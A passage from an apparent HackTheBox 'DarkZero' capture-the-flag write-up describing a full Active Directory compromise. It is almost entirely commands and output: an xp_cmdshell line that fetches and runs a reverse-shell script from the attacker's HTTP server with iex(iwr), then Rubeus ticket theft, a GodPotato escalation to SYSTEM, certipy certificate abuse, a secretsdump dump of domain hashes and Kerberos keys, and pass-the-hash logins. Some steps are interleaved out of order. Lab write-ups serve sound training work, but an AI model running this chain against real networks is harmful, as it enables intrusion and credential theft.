                                                  
SeSystemEnvironmentPrivilege = *S-1-5-32-544                                                                                                                                                                        
                                                  
SeProfileSingleProcessPrivilege = *S-1-5-32-544                                                                                                                                                                     
                                                  
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420                                                                                                            
                                                  
SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003                                
                                                  
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-551                                                                                                                                                      
                                                  
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-32-551                                                                                                                                       
                                                  
SeTakeOwnershipPrivilege = *S-1-5-32-544                                                                                                                                                                            
                                                  
SeUndockPrivilege = *S-1-5-32-544                                                                                                                                                                                   
                                                  
SeEnableDelegationPrivilege = *S-1-5-32-544                                                                                                                                                                         
                                                  
SeManageVolumePrivilege = *S-1-5-32-544                                                                                                                                                                             
                                                  
SeRemoteInteractiveLogonRight = *S-1-5-32-544                                                                                                                                                                       
                                                  
SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6                                                                                                                                                 
                                                  
SeCreateGlobalPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6                                                                                                                                                
                                                  
SeIncreaseWorkingSetPrivilege = *S-1-5-32-545                                                                                                                                                                       
                                                  
SeTimeZonePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549                                                                                                                                                         
                                                  
SeCreateSymbolicLinkPrivilege = *S-1-5-32-544                                                                                                                                                                       
                                                  
SeDelegateSessionUserImpersonatePrivilege = *S-1-5-32-544                                                                                                                                                           
                                                  
[Version]                                                                                                                                                                                                           
                                                  
signature="$CHICAGO$"                                                                                                                                                                                               
                                                  
Revision=1                                                                                                                                                                                                          
                                                  
NULL
```

We then create a `shell.ps1` file and open python http server and a `nc` listener :

```bash
>  nano shell.ps1  
>  python3 -m http.server 9000 --bind 10.10.14.129  
  
Serving HTTP on 10.10.14.129 port 9000 (http://10.10.14.129:9000/) ...
```

```bash
>  nc -lvnp 1337  
  
Listening on 0.0.0.0 1337
```

And we get a shell on the listener :

```SQL
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -c "iex(iwr http://10.10.14.129:9000/shell.ps1 -UseBasicParsing)"
```

```PowerShell
PS C:\Windows\system32>cd C:\Users\svc_sql\Desktop
PS C:\Users\svc_sql\Desktop> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State      
============================= ============================== ========  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled    
SeCreateGlobalPrivilege       Create global objects          Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

We copy our `privesc` windows executables to the directory on which the python server is running :

```bash
cp ~/Arsenal/windows/dotnet/Rubeus.exe ~/htb/darkzero/
cp ~/Arsenal/windows/exe/RunasCs.exe ~/htb/darkzero/
cp ~/Arsenal/windows/potato/GodPotato-NET4.exe ~/htb/darkzero/
```

```PowerShell
PS C:\Users\svc_sql\Desktop> cd C:\Windows\Tasks
PS C:\Windows\Tasks> iwr http://10.10.14.129:9000/Rubeus.exe -OutFile Rubeus.exe
PS C:\Windows\Tasks> .\Rubeus.exe tgtdeleg /nowrap  
  
  ______        _                         
 (_____ \      | |                        
  _____) )_   _| |__  _____ _   _  ___    
 |  __  /| | | |  _ \| ___ | | | |/___)  
 | |  \ \| |_| | |_) ) ____| |_| |___ |  
 |_|   |_|____/|____/|_____)____/(___/  
  
 v2.2.0    
  
  
[*] Action: Request Fake Delegation TGT (current user)  
  
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'  
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC02.darkzero.ext'  
[+] Kerberos GSS-API initialization success!  
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.  
[*] Found the AP-REQ delegation ticket in the GSS-API output.  
[*] Authenticator etype: aes256_cts_hmac_sha1  
[*] Extracted the service ticket session key from the ticket cache: YSVhE5jcoOVDX51t79ZL5FGsaqiAzSSAZYB4/8yZJhs=  
[+] Successfully decrypted the authenticator  
[*] base64(ticket.kirbi):  
  
     doIFgDCCBXygAwIBBaEDAgEWooIEhjCCBIJhggR+MIIEeqADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEPjCCBDqgAwIBEqEDAgECooIELASCBCjENr76dsX9dDf9qH5XbABCgHx84VcZZgotE5KMDlwC8ikV+zJw  
crid3GCpC75rI7BWdfFijXf7Hg1EWq7zacdWO7rB41sY2ChpxiWi3D1miECedb235sM7cuojDkkQlGSa0qiYpMIDz0Y5ez6eu72pN8WdrPthiDHrfJgdZxUAz733Y/JCBcbSs7FuZoUuMcgxHil0PO6gj9ipwWHjYaDriruYWJ7mvxSOTuGQKKI3ZirjnFO/QTH6/gNqodYJJJNlDU  
v3WTOgb8/hyN+QE62J1ZzhDxsSrGbFLqGO5DoK3OdRshNKJ5kf0J8i/mr6H3gsD4IZHcU8BgDSV630tM66eRw07WNt6DbMnJJGFgHFHNDV/3DgAAtwfCm6aAHfp07y1snhbzVFUZ/jjgd9UG0GoExPD7cWDhOLD2rRNGFIuefvR2dooDOKUc6eKhOlWLmPxDwagBfbNi+qy4kiy9ds  
NLGm4FL8Z30l2un17mcI2MvxFq5LzVd0VXpBrxMA/WK8jpGWPDHn7e2KaXKa9an7JhNrChHmNd1BRTCIReMOpRr+N/3hyh13iqYDb8FAw+fEn8BdjJ3YXr9vJ4KPUK2LGVHzvR2YvJj0lUuYy0sbUg1YE9AdzMe7tgtA6yefc2U29SkPiWXVLFUHONEyaaql1WoG4Ri/QXrWi2250/  
y9KKWCDLHxr0RwbxjlWTkJ5eo4CHLw1DLODMMqsS76cGX3cevNqeR6uYfk8wTYzjREtcs/w2j+rVxNXiZvz1lv8q4bESMDHH+ktCwbXJTr6AKXBRb5ILxTp4ZU/f9CjYwQ2+ElAiSsO2Hh7qXsPwnKKEmPq4en86qtdrim6vjmwmJv+za+g+MKm5kRODaEf/+waXtQJNIVJ9ux7bNp  
SRpbf781Y8Uw4mP3CRF53a03B6w6S7HhAAjZPEtcLfrmK9qWp5g+Vfs9lS3PD1ZL11lJ74Het6R9z0glaMrwYilt2ANKx65LzjzO8JMUznVQlu9Mjedqa0hWlce0tBqYa3Z5ZNsLvrID4yzBGAezdXlSlXcRW3E/ecvTt4Tluai/AMsldMpe/9efoj2hGWjusGMFgrpcvAbX1VPpEh  
tMgkzMF9RukDvvGOaAL/wdglpBQXA8o15HjLEgpbaJ3pCbsClDSFGro6JXJGlaHcHu2XaDSJnBb7Ps/VnxXrkzW6Jh7gmg+DurlMTc0T8m5MXMDU/qBxq1NQ/IiFAwO3569eaPl79Cmbbo9LmXlRIutHKbGdKAJbxG90/3jUXmpPLAMIptZvyz9R+JoVN1wbZwPzIlKoe7ftxSodl2  
DUDI/3nLby1dNKXhUA8o2K1zFrtmo1mM5hwpIl405RfRwigHvsfcAOPx8qE5ZdcV5RwtpdZpjTPT/R4TZcv4a7zx3RJRTkqfBJSckqXpI3RiCaOB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIEQzUmIspVSH5Phc9mNk8BX7rRE3f/E+7prBM635GZ  
LkoQ4bDERBUktaRVJPLkVYVKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyNjA2MjMyMDUzNDhaphEYDzIwMjYwNjI0MDU1NzM5WqcRGA8yMDI2MDYzMDEwMTIzOVqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5FWFQ=  
PS C:\Windows\Tasks> iwr http://10.10.14.129:9000/RunasCs.exe -OutFile RunasCs.exe 
```

We convert the `b64` to a `kerb` ticket `credential cache` :

```bash
>  cd ~/htb/darkzero  
>  nano svc_sql.kirbi.b64  
>  cat svc_sql.kirbi.b64  
doIFgDCCBXygAwIBBaEDAgEWooIEhjCCBIJhggR+MIIEeqADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEPjCCBDqgAwIBEqEDAgECooIELASCBCjENr76dsX9dDf9qH5XbABCgHx84VcZZgotE5KMDlwC8ikV+zJwcrid3G  
CpC75rI7BWdfFijXf7Hg1EWq7zacdWO7rB41sY2ChpxiWi3D1miECedb235sM7cuojDkkQlGSa0qiYpMIDz0Y5ez6eu72pN8WdrPthiDHrfJgdZxUAz733Y/JCBcbSs7FuZoUuMcgxHil0PO6gj9ipwWHjYaDriruYWJ7mvxSOTuGQKKI3ZirjnFO/QTH6/gNqodYJJJNlDUv3WTOg  
b8/hyN+QE62J1ZzhDxsSrGbFLqGO5DoK3OdRshNKJ5kf0J8i/mr6H3gsD4IZHcU8BgDSV630tM66eRw07WNt6DbMnJJGFgHFHNDV/3DgAAtwfCm6aAHfp07y1snhbzVFUZ/jjgd9UG0GoExPD7cWDhOLD2rRNGFIuefvR2dooDOKUc6eKhOlWLmPxDwagBfbNi+qy4kiy9dsNLGm4F  
L8Z30l2un17mcI2MvxFq5LzVd0VXpBrxMA/WK8jpGWPDHn7e2KaXKa9an7JhNrChHmNd1BRTCIReMOpRr+N/3hyh13iqYDb8FAw+fEn8BdjJ3YXr9vJ4KPUK2LGVHzvR2YvJj0lUuYy0sbUg1YE9AdzMe7tgtA6yefc2U29SkPiWXVLFUHONEyaaql1WoG4Ri/QXrWi2250/y9KKWC  
DLHxr0RwbxjlWTkJ5eo4CHLw1DLODMMqsS76cGX3cevNqeR6uYfk8wTYzjREtcs/w2j+rVxNXiZvz1lv8q4bESMDHH+ktCwbXJTr6AKXBRb5ILxTp4ZU/f9CjYwQ2+ElAiSsO2Hh7qXsPwnKKEmPq4en86qtdrim6vjmwmJv+za+g+MKm5kRODaEf/+waXtQJNIVJ9ux7bNpSRpbf7  
81Y8Uw4mP3CRF53a03B6w6S7HhAAjZPEtcLfrmK9qWp5g+Vfs9lS3PD1ZL11lJ74Het6R9z0glaMrwYilt2ANKx65LzjzO8JMUznVQlu9Mjedqa0hWlce0tBqYa3Z5ZNsLvrID4yzBGAezdXlSlXcRW3E/ecvTt4Tluai/AMsldMpe/9efoj2hGWjusGMFgrpcvAbX1VPpEhtMgkzM  
F9RukDvvGOaAL/wdglpBQXA8o15HjLEgpbaJ3pCbsClDSFGro6JXJGlaHcHu2XaDSJnBb7Ps/VnxXrkzW6Jh7gmg+DurlMTc0T8m5MXMDU/qBxq1NQ/IiFAwO3569eaPl79Cmbbo9LmXlRIutHKbGdKAJbxG90/3jUXmpPLAMIptZvyz9R+JoVN1wbZwPzIlKoe7ftxSodl2DUDI/3  
nLby1dNKXhUA8o2K1zFrtmo1mM5hwpIl405RfRwigHvsfcAOPx8qE5ZdcV5RwtpdZpjTPT/R4TZcv4a7zx3RJRTkqfBJSckqXpI3RiCaOB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIEQzUmIspVSH5Phc9mNk8BX7rRE3f/E+7prBM635GZLkoQ4b  
DERBUktaRVJPLkVYVKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyNjA2MjMyMDUzNDhaphEYDzIwMjYwNjI0MDU1NzM5WqcRGA8yMDI2MDYzMDEwMTIzOVqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5FWFQ=  
>  base64 -d svc_sql.kirbi.b64 > svc_sql.kirbi  
  
>  ticketConverter.py svc_sql.kirbi svc_sql.ccache  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] converting kirbi to ccache...  
[+] done  
>  export KRB5CCNAME=$PWD/svc_sql.ccache  
  
>  klist  
  
Ticket cache: FILE:/home/vagabond/htb/darkzero/svc_sql.ccache  
Default principal: svc_sql@DARKZERO.EXT  
  
Valid starting       Expires              Service principal  
06/23/2026 22:53:48  06/24/2026 07:57:39  krbtgt/DARKZERO.EXT@DARKZERO.EXT  
       renew until 06/30/2026 12:12:39
```

We then use `certipy` and `Impacket` and on the `DC shell` :

```bash
PS C:\Windows\Tasks> cd C:\Users\svc_sql\Downloads  
PS C:\Users\svc_sql\Downloads> dir RunasCs.exe, GodPotato-NET4.exe  
  
  
   Directory: C:\Users\svc_sql\Downloads  
  
  
Mode                 LastWriteTime         Length Name                                                                    
----                 -------------         ------ ----                                                                    
-a----         6/23/2026   9:21 PM          51712 RunasCs.exe                                                             
-a----         6/23/2026   9:21 PM          57344 GodPotato-NET4.exe                                                      
  
  
PS C:\Users\svc_sql\Downloads> .\RunasCs.exe svc_sql 'Password1!' "whoami /priv" -l 5 --bypass-uac  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                               State      
============================= ========================================= ========  
SeMachineAccountPrivilege     Add workstations to domain                Disabled  
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
PS C:\Users\svc_sql\Downloads> .\RunasCs.exe svc_sql 'Password1!' "C:\Users\svc_sql\Downloads\GodPotato-NET4.exe -cmd C:\Users\svc_sql\Downloads\readflag.bat" -l 5 --bypass-uac  
  
[*] CombaseModule: 0x140718850375680  
[*] DispatchTable: 0x140718852962632  
[*] UseProtseqFunction: 0x140718852257968  
[*] UseProtseqFunctionParamCount: 6  
[*] HookRPC  
[*] Start PipeServer  
[*] CreateNamedPipe \\.\pipe\71a70adf-336d-4fca-b4f5-5ecf9242e2f2\pipe\epmapper  
[*] Trigger RPCSS  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046  
[*] DCOM obj IPID: 0000f802-0fa0-ffff-5713-d127d457e9ac  
[*] DCOM obj OXID: 0xa3baf39e73aed242  
[*] DCOM obj OID: 0x60d4e08b19f921cc  
[*] DCOM obj Flags: 0x281  
[*] DCOM obj PublicRefs: 0x0  
[*] Marshal Object bytes len: 100  
[*] UnMarshal Object  
[*] Pipe Connected!  
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE  
[*] CurrentsImpersonationLevel: Impersonation  
[*] Start Search System Token  
[*] PID : 1016 Token:0x472  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation  
[*] Find System Token : True  
[*] UnmarshalObject: 0x80070776  
[*] CurrentUser: NT AUTHORITY\SYSTEM  
[*] process start with pid 3568  
PS C:\Users\svc_sql\Downloads> type C:\Users\Administrator\Desktop\user.txt > C:\Users\svc_sql\Downloads\user.txt  
'@ | Set-Content C:\Users\svc_sql\Downloads\readflag.batPS C:\Users\svc_sql\Downloads>    
.\RunasCs.exe svc_sql 'Password1!' "C:\Users\svc_sql\Downloads\GodPotato-NET4.exe -cmd C:\Users\svc_sql\Downloads\readflag.bat" -l 5 --bypass-uac  
type C:\Users\svc_sql\Downloads\user.txtPS C:\Users\svc_sql\Downloads>    
PS C:\Users\svc_sql\Downloads> @'  
@echo off  
type C:\Users\Administrator\Desktop\user.txt > C:\Users\svc_sql\Downloads\user.txt  
'@ | Set-Content C:\Users\svc_sql\Downloads\readflag.batPS C:\Users\svc_sql\Downloads> PS C:\Users\svc_sql\Downloads>    
PS C:\Users\svc_sql\Downloads> .\RunasCs.exe svc_sql 'Password1!' "C:\Users\svc_sql\Downloads\GodPotato-NET4.exe -cmd C:\Users\svc_sql\Downloads\readflag.bat" -l 5 --bypass-uac  
  
  
[*] CombaseModule: 0x140718850375680  
[*] DispatchTable: 0x140718852962632  
[*] UseProtseqFunction: 0x140718852257968  
[*] UseProtseqFunctionParamCount: 6  
[*] HookRPC  
[*] Start PipeServer  
[*] Trigger RPCSS  
[*] CreateNamedPipe \\.\pipe\0fbc4f4e-b6d4-4e29-a243-31185c3f3230\pipe\epmapper  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046  
[*] DCOM obj IPID: 0000f402-0e54-ffff-bd22-19fdcbb7bf65  
[*] DCOM obj OXID: 0xba5f726f2e794bae  
[*] DCOM obj OID: 0xa8b29d6babe0bd4d  
[*] DCOM obj Flags: 0x281  
[*] DCOM obj PublicRefs: 0x0  
[*] Marshal Object bytes len: 100  
[*] UnMarshal Object  
[*] Pipe Connected!  
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE  
[*] CurrentsImpersonationLevel: Impersonation  
[*] Start Search System Token  
[*] PID : 1016 Token:0x472  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation  
[*] Find System Token : True  
[*] UnmarshalObject: 0x80070776  
[*] CurrentUser: NT AUTHORITY\SYSTEM  
[*] process start with pid 2932  
PS C:\Users\svc_sql\Downloads> type C:\Users\svc_sql\Downloads\user.txt  
  
PS C:\Users\svc_sql\Downloads> cb8b51a91****************1c1262f
```

We got the user flag.

We proceed to privesc by getting `SYSTEM` with `GodPotato` :

```PowerShell
PS C:\Users\svc_sql\Downloads> .\RunasCs.exe svc_sql 'Password1!' "C:\Users\svc_sql\Downloads\GodPotato-NET4.exe -cmd C:\Users\Public\run_monitor.bat" -l 5 --bypass-uac  
  
[*] CombaseModule: 0x140718850375680  
[*] DispatchTable: 0x140718852962632  
[*] UseProtseqFunction: 0x140718852257968  
[*] UseProtseqFunctionParamCount: 6  
[*] HookRPC  
[*] Start PipeServer  
[*] Trigger RPCSS  
[*] CreateNamedPipe \\.\pipe\64043504-4dc1-4d2b-b579-9b2d6e44e03c\pipe\epmapper  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046  
[*] DCOM obj IPID: 00002802-05b8-ffff-6440-2c66be31f929  
[*] DCOM obj OXID: 0x9b82b714bbc63a32  
[*] DCOM obj OID: 0xb872eb5e54379065  
[*] DCOM obj Flags: 0x281  
[*] DCOM obj PublicRefs: 0x0  
[*] Marshal Object bytes len: 100  
[*] UnMarshal Object  
[*] Pipe Connected!  
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE  
[*] CurrentsImpersonationLevel: Impersonation  
[*] Start Search System Token  
[*] PID : 1016 Token:0x472  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation  
[*] Find System Token : True  
[*] UnmarshalObject: 0x80070776  
[*] CurrentUser: NT AUTHORITY\SYSTEM  
[*] process start with pid 3120
```

```bash
PS C:\Users\svc_sql\Downloads> .\RunasCs.exe svc_sql 'Password1!' "C:\Users\svc_sql\Downloads\GodPotato-NET4.exe -cmd `"cmd.exe /c C:\Users\Public\debug_mon.bat`"" -l 5 --bypass-uac  
type C:\Users\Public\mon.log  
  
  
[*] CombaseModule: 0x140718850375680  
[*] DispatchTable: 0x140718852962632  
[*] UseProtseqFunction: 0x140718852257968  
[*] UseProtseqFunctionParamCount: 6  
[*] HookRPC  
[*] Start PipeServer  
[*] Trigger RPCSS  
[*] CreateNamedPipe \\.\pipe\f4b45941-2b94-482a-97b3-a3c84d0053ac\pipe\epmapper  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046  
[*] DCOM obj IPID: 00009c02-06f4-ffff-e014-74d0a37a3c1e  
[*] DCOM obj OXID: 0x2eb331d1ce210440  
[*] DCOM obj OID: 0xabf423f8536d7a3  
[*] DCOM obj Flags: 0x281  
[*] DCOM obj PublicRefs: 0x0  
[*] Marshal Object bytes len: 100  
[*] UnMarshal Object  
[*] Pipe Connected!  
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE  
[*] CurrentsImpersonationLevel: Impersonation  
[*] Start Search System Token  
[*] PID : 1016 Token:0x472  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation  
[*] Find System Token : True  
[*] UnmarshalObject: 0x80070776  
[*] CurrentUser: NT AUTHORITY\SYSTEM  
[*] process start with pid 3128  
Microsoft Windows [Version 10.0.20348.2113]  
(c) Microsoft Corporation. All rights reserved.  
```

On host :

```bash
>  cd ~/htb/darkzero && export KRB5_CONFIG=$PWD/krb5.conf KRB5CCNAME=$PWD/svc_sql.ccache  
  
>  proxychains4 -q -f proxychains.conf certipy req -u svc_sql -k -no-pass -dc-host DC02.darkzero.ext -target DC02.darkzero.ext -ca darkzero-ext-DC02-CA -template user -dc-ip 172.16.20.2  
  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.20.2@53 answered The DNS operation timed out.; Server Do53:172.16.20.2@53 answered The DNS operation timed out.  
; Server Do53:172.16.20.2@53 answered The DNS operation timed out.  
[!] Use -debug to print a stacktrace  
[*] Requesting certificate via RPC  
[*] Request ID is 5  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'svc_sql@darkzero.ext'  
[*] Certificate object SID is 'S-1-5-21-1969715525-31638512-2552845157-1103'  
[*] Saving certificate and private key to 'svc_sql.pfx'  
[*] Wrote certificate and private key to 'svc_sql.pfx'
```

```bash
>  proxychains4 -q -f proxychains.conf certipy auth -pfx svc_sql.pfx \  
 -dc-ip 172.16.20.2 -domain darkzero.ext -username svc_sql -no-save  
Certipy v5.0.4 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*]     SAN UPN: 'svc_sql@darkzero.ext'  
[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'  
[*] Using principal: 'svc_sql@darkzero.ext'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Trying to retrieve NT hash for 'svc_sql'  
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

Then we use `Impacket` :

```bash
>  export KRB5_CONFIG=~/htb/darkzero/krb5.conf KRB5CCNAME=~/htb/darkzero/dc01.ccache  
  
>  secretsdump.py -k -no-pass DC01.darkzero.htb -just-dc  
  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::  
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::  
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::  
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:caad6b118b860dbe0296c51399170b62:::  
[*] Kerberos keys grabbed  
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd  
Administrator:0x13:a23315d970fe9d556be03ab611730673  
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd  
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362  
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726  
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41  
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3  
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7  
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea  
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd  
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e  
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db  
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b  
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941  
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db  
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a  
darkzero-ext$:aes256-cts-hmac-sha1-96:212c8881bc0c28e6a68cca9c3a258a77958fca32137de64fd8d7bb1941bc0799  
darkzero-ext$:aes128-cts-hmac-sha1-96:1ab56d98beb199861b4a206815047deb  
darkzero-ext$:0x17:caad6b118b860dbe0296c51399170b62  
[*] Cleaning up...
```

We have the `Admin hash` :
```bash
aad3b435b51**********************b0a869a1cba40726
```

```bash
>  nxc winrm 10.129.20.89 -u Administrator -H '5917507bdf2ef2c2b0a869a1cba40726'  
WINRM       10.129.20.89    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)    
WINRM       10.129.20.89    5985   DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
```

So we can get a shell :

```bash
>  evil-winrm -i 10.129.20.89 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt  
53584***************aced9
```

And we got root.
